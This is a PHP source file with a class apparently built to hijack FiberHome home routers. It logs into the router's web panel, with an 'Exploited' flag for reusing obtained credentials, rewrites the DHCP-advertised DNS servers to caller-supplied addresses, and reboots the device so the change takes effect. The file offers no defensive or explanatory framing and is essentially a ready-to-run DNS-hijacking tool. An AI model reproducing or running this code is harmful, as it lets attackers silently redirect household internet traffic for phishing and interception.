<?php



class FiberHomeNew
{

    private $ch;
    private $Host;
    public $User;
    public $Pass;
    public $Auth;
    public $Exploited;

    function GetStr($string, $start, $end)
    {
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }



    function __construct()
    {
        $this->ch 		= curl_init();
        $this->Auth		= false;
    }

    public function Login($Host,$User,$Pass)
    {	
        @unlink("cookie.txt");
        if ($this->Exploited == true) {
            $User = $this->User;
            $Pass = $this->Pass;
        }
        @unlink("cookie.txt");
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/login.html");
		curl_setopt($this->ch, CURLOPT_HEADER	, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION	, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, "cookie.txt");
		curl_setopt($this->ch, CURLOPT_POST, 0);
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);echo $result;
		curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/goform/webLogin");
		curl_setopt($this->ch, CURLOPT_HEADER	, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION	, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_COOKIEFILE, "cookie.txt");
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, "User={$User}&Passwd={$Pass}");
		curl_setopt($this->ch, CURLOPT_POST, 1);
		$headers = array();
		$headers[] = "Origin: http://{$Host}";
		$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
		$headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
		$headers[] = "Cache-Control: max-age=0";
		$headers[] = "Referer: http://{$Host}/login_common.asp";
		$headers[] = "Connection: keep-alive";
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($this->ch);echo $result;
        $Status = (strpos($result,' <div id="headerLogout"><span id="headerLogoutSpan">Logout</span></div>') !== false) ? true : false;

        if ($Status)
        {
            //
            $this->Host = $Host;
            $this->User = $User;
            $this->Pass = $Pass;
            $this->Auth = $Status;
        }
        return $Status;
    }






    public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
    {
        $Resultado = false;
        if ($this->Auth)
        {
			curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/goform/setDhcp");
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_POSTFIELDS, "dhcpType=1&dhcpStart=192.168.1.2&dhcpEnd=192.168.1.254&dhcpMask=255.255.255.0&dhcpPriDns={$DNS1}&dhcpSecDns={$DNS2}&dhcpGateway=192.168.1.1&dhcptime=24&dhcptime_m=0&option_60enable_s=0");
			curl_setopt($this->ch, CURLOPT_POST, 1);
			
			$headers = array();
			$headers[] = "Cookie: loginName=admin";
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: application/x-www-form-urlencoded";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
			$headers[] = "Cache-Control: max-age=0";
			$headers[] = "Referer: http://{$Host}/internet/dhcp_service.asp";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);
			echo $result;

        }
        return $Resultado;
	}
    public function DoOthers($Host,$User,$Pass)
    {

        if ($this->Auth)
        {
			curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/goform/reboot");
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($this->ch, CURLOPT_POST, 0);
			$headers = array();
			$headers[] = "Cookie: loginName=admin";
			$headers[] = "Origin: http://{$Host}";
			$headers[] = "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7";
			$headers[] = "Upgrade-Insecure-Requests: 1";
			$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";
			$headers[] = "Content-Type: application/x-www-form-urlencoded";
			$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
			$headers[] = "Cache-Control: max-age=0";
			$headers[] = "Referer: http://{$Host}/";
			$headers[] = "Connection: keep-alive";
			curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
			$result = curl_exec($this->ch);
			//echo $result;
        }
        @unlink("cookies.txt");
    }









}


